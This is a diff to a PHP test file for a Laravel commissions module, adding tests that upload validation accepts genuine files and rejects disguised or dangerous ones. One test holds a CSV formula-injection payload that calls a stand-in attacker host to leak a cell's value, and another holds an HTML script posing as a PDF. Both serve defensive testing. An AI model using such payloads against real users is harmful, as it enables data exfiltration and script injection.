@@ -9,6 +9,8 @@ use App\Support\Formatting\Money;
 use Carbon\CarbonImmutable;
 use Illuminate\Http\UploadedFile;
 use Illuminate\Support\Facades\Storage;
+use OpenSpout\Common\Entity\Row;
+use OpenSpout\Writer\XLSX\Writer;
 use Tests\Fakes\AuditEntry;
 use Tests\Fakes\ContractFakes;
 use Tests\Modules\Comisiones\Feature\Concerns\ClosedPeriods;
@@ -33,6 +35,34 @@ beforeEach(function () {
 function captureSupport(string $name = 'soporte.pdf', int $kilobytes = 120): UploadedFile
 {
     return UploadedFile::fake()->create($name, $kilobytes, 'application/pdf');
+}
+
+/**
+ * A real upload whose bytes are a valid file of its extension (or these
+ * bytes), so the support rule reads its true MIME type and content.
+ */
+function realSupport(string $name, ?string $content = null): UploadedFile
+{
+    $path = tempnam(sys_get_temp_dir(), 'soporte').'.tmp';
+    $extension = $content === null ? strtolower(pathinfo($name, PATHINFO_EXTENSION)) : null;
+
+    if ($extension === 'xlsx') {
+        $writer = new Writer;
+        $writer->openToFile($path);
+        $writer->addRow(Row::fromValues(['Factura', 'Valor']));
+        $writer->close();
+    } elseif ($extension === 'jpg' || $extension === 'jpeg') {
+        imagejpeg(imagecreatetruecolor(2, 2), $path);
+    } elseif ($extension === 'png') {
+        imagepng(imagecreatetruecolor(2, 2), $path);
+    } else {
+        file_put_contents($path, $content ?? match ($extension) {
+            'pdf' => "%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n",
+            'csv' => "Factura;Valor\nFV-1;-5.000,50\n",
+        });
+    }
+
+    return new UploadedFile($path, $name, null, null, true);
 }
 
 /**
@@ -63,7 +93,7 @@ function adjustmentForm(array $overrides = []): array
         'tipo' => 'reintegro',
         'valor' => '350.000',
         'descripcion' => 'Comisión de junio que no se pagó',
-        'soporte' => captureSupport('acta.xlsx', 20),
+        'soporte' => realSupport('acta.xlsx'),
     ], $overrides);
 }
 
@@ -182,7 +212,13 @@ it('validates the OBR form in Spanish', function () {
     expect(ObrRecord::query()->count())->toBe(0);
 });
 
-it('takes a support in pdf, jpg, png, xlsx or csv up to 10 MB only', function (string $name, int $kilobytes, bool $accepted) {
+it('takes a real support in pdf, jpg, jpeg, png, xlsx or csv', function (string $name) {
+    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['soporte' => realSupport($name)]))->assertSessionHasNoErrors();
+
+    expect(ObrRecord::query()->sole()->soporte)->toEndWith('.'.pathinfo($name, PATHINFO_EXTENSION));
+})->with(['factura.pdf', 'foto.jpg', 'foto.jpeg', 'captura.png', 'acta.xlsx', 'detalle.csv']);
+
+it('takes a support up to 10 MB only, and only of those types', function (string $name, int $kilobytes, bool $accepted) {
     $response = $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['soporte' => captureSupport($name, $kilobytes)]));
 
     if ($accepted) {
@@ -193,16 +229,23 @@ it('takes a support in pdf, jpg, png, xlsx or csv up to 10 MB only', function (s
         expect(ObrRecord::query()->count())->toBe(0);
     }
 })->with([
-    'pdf' => ['factura.pdf', 200, true],
-    'jpg' => ['foto.jpg', 200, true],
-    'png' => ['captura.png', 200, true],
-    'xlsx' => ['acta.xlsx', 200, true],
-    'csv' => ['detalle.csv', 5, true],
     '10 MB' => ['grande.pdf', 10240, true],
     'more than 10 MB' => ['enorme.pdf', 10241, false],
     'exe' => ['programa.exe', 10, false],
     'docx' => ['carta.docx', 10, false],
 ]);
+
+it('rejects a CSV support with a formula or a support whose content lies about its type, and stores nothing', function () {
+    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm([
+        'soporte' => realSupport('detalle.csv', "Factura;Detalle\nFV-1;=HYPERLINK(\"http://atacante/?x=\"&A1,\"ver\")\n"),
+    ]))->assertSessionHasErrors(['soporte' => 'El CSV tiene una fórmula en la fila 2, columna 2. Las celdas no pueden empezar por =, +, - o @, salvo los números.']);
+    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm([
+        'soporte' => realSupport('factura.pdf', '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>'),
+    ]))->assertSessionHasErrors(['soporte' => 'El contenido del soporte no corresponde a un archivo PDF.']);
+
+    expect(ObrRecord::query()->count() + AdjustmentRecord::query()->count())->toBe(0)
+        ->and(Storage::disk('local')->allFiles())->toBe([]);
+});
 
 it('registers a reimbursement and a deduction with Colombian amounts', function () {
     $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm())
@@ -245,7 +288,8 @@ it('downloads the support of a capture to any viewer and audits the download', f
     $response = $this->actingAs($viewer)->get("/comisiones/ajustes/obr/{$obr->id}/soporte")->assertOk();
 
     expect($response->streamedContent())->toBe('%PDF-1.4 soporte')
-        ->and($response->headers->get('content-disposition'))->toContain("soporte-obr-{$obr->id}.pdf");
+        ->and($response->headers->get('content-disposition'))->toContain("soporte-obr-{$obr->id}.pdf")
+        ->and($response->headers->get('content-type'))->toBe('application/octet-stream');
     $downloaded = AuditRecord::query()->where('evento', 'comisiones.support.downloaded')->sole();
     expect($downloaded->user_id)->toBe($viewer->id)
         ->and($downloaded->sujeto_tipo)->toBe('obr')
